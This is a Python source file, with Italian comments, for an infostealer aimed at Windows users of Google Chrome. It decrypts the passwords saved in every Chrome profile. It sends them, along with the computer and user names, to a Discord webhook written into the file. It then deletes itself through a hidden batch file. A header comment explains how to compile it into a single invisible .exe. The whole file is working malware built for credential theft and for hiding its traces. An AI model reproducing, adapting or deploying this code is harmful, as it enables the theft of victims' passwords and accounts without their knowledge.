# Comando per compilare in un .exe invisibile e singolo:
# pyinstaller --onefile --noconsole --icon=NONE nome_del_file.py

import os
import json
import base64
import sqlite3
import shutil
import requests
import time
import sys
import tempfile
from datetime import datetime
import ctypes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import subprocess

# ========== CONFIGURAZIONE ==========
# SOSTITUISCI CON IL TUO VERO URL WEBHOOK DISCORD
WEBHOOK_URL = "https://discord.com/api/webhooks/1424422878170054751/ZwFVO3N_BXBPXFkoLK7QW0y1db7iySfaoVFRe4xC-2g5lqjvF2IqlLsxzU6iWzz7F8u6" # Incolla qui il tuo URL
DELETE_AFTER_SEND = True
# ========== FINE CONFIGURAZIONE ==========

class ChromePasswordExtractor:
    def __init__(self):
        self.webhook_url = WEBHOOK_URL

    def get_chrome_paths(self):
        paths = []
        base_path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data')
        if not os.path.exists(base_path): return paths
        profiles = [d for d in os.listdir(base_path) if d.startswith('Profile ') or d == 'Default']
        for profile_name in profiles:
            profile_path = os.path.join(base_path, profile_name)
            if os.path.exists(os.path.join(profile_path, 'Login Data')):
                paths.append({'name': profile_name, 'path': profile_path})
        return paths

    def CryptUnprotectData(self, encrypted_data):
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(ctypes.create_string_buffer(encrypted_data), ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
            decrypted_data = ctypes.string_at(pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
            return decrypted_data
        return None

    def get_encryption_key(self, profile_path):
        local_state_path = os.path.join(os.path.dirname(profile_path), "Local State")
        if not os.path.exists(local_state_path): return None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            return self.CryptUnprotectData(base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:])
        except Exception: return None

    def decrypt_password(self, encrypted_password, key):
        try:
            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                iv, payload = encrypted_password[3:15], encrypted_password[15:]
                cipher = Cipher(algorithms.AES(key), modes.GCM(iv, payload[-16:]), backend=default_backend())
                return cipher.decryptor().update(payload[:-16]).decode('utf-8')
            else:
                decrypted_pass = self.CryptUnprotectData(encrypted_password)
                return decrypted_pass.decode('utf-8') if decrypted_pass else "[FAIL]"
        except Exception: return "[FAIL]"

    def extract_passwords(self):
        all_passwords = []
        for profile in self.get_chrome_paths():
            key = self.get_encryption_key(profile['path'])
            if not key: continue
            
            login_db_path = os.path.join(profile['path'], "Login Data")
            temp_db = os.path.join(tempfile.gettempdir(), f"temp_{os.urandom(6).hex()}.db")
            
            try:
                shutil.copy2(login_db_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, username, enc_pass in cursor.fetchall():
                    if url and username and enc_pass:
                        decrypted_password = self.decrypt_password(enc_pass, key)
                        if not decrypted_password.startswith("[FAIL]"):
                            all_passwords.append({'url': url, 'username': username, 'password': decrypted_password, 'profile': profile['name']})
                conn.close()
            except Exception:
                continue # Se qualcosa va storto, passa al profilo successivo
            finally:
                # Questo blocco viene eseguito SEMPRE, garantendo la pulizia.
                if os.path.exists(temp_db):
                    os.remove(temp_db)
        return all_passwords

    def get_system_info(self):
        return {'computer_name': os.environ.get('COMPUTERNAME', 'Sconosciuto'), 'username': os.environ.get('USERNAME', 'Sconosciuto')}

    def send_to_discord(self, passwords):
        sys_info = self.get_system_info()
        payload = {"username": "Password Bot", "embeds": [{
            "title": "🔑 Report Password Chrome", "color": 15158332,
            "fields": [
                {"name": "Computer", "value": f"`{sys_info['username']}@{sys_info['computer_name']}`", "inline": True},
                {"name": "Password Trovate", "value": f"**{len(passwords)}**", "inline": True},
                {"name": "Data", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False}
            ]}]}
        try: requests.post(self.webhook_url, json=payload, timeout=10).raise_for_status()
        except requests.exceptions.RequestException: return False
        time.sleep(1)

        for chunk in [passwords[i:i + 5] for i in range(0, len(passwords), 5)]:
            payload = {"username": "Password Bot", "embeds": [{"color": 3066993, "fields": [
                {"name": f"🌐 {p['url']}", "value": f"**Utente:** `{p['username']}`\n**Password:** `{p['password']}`\n**Profilo:** `{p['profile']}`"}
                for p in chunk
            ]}]}
            try:
                requests.post(self.webhook_url, json=payload, timeout=10).raise_for_status()
                time.sleep(1)
            except requests.exceptions.RequestException: return False
        return True

    def self_destruct(self):
        try:
            current_file_path = sys.executable if getattr(sys, 'frozen', False) else __file__
            bat_path = os.path.join(tempfile.gettempdir(), f"del_{os.urandom(6).hex()}.bat")
            with open(bat_path, "w") as f:
                f.write(f'@echo off\n')
                f.write(f'timeout /t 3 /nobreak > nul\n')
                f.write(f'del "{current_file_path}"\n')
                f.write(f'(goto) 2>nul & del "%~f0"\n')
            subprocess.Popen([bat_path], creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception: pass

def main():
    if "..." in WEBHOOK_URL: sys.exit()
    extractor = ChromePasswordExtractor()
    passwords = extractor.extract_passwords()
    if passwords:
        success = extractor.send_to_discord(passwords)
        if success and DELETE_AFTER_SEND:
            extractor.self_destruct()
    sys.exit()

if __name__ == "__main__":
    main()